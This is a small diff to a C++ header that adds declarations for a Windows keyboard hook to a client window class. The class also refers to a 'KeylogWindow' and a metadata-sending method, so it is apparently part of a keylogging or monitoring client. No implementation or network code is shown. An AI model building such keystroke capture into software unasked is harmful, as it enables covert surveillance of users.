@@ -63,6 +63,15 @@ private:
     void OnClose(wxCloseEvent& event);
     void SendMetadata();
 
+    void RemoveKeyboardHook();
+    void SetKeyboardHook();
+    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+    static ClientWindow* instance; // Static pointer to the current instance
+
+    static bool allowHook;
+
+    HHOOK keyboardHook;
+
     friend class KeylogWindow;
     // std::unique_ptr<Logger> logger = std::make_unique<Logger>(this);
 };
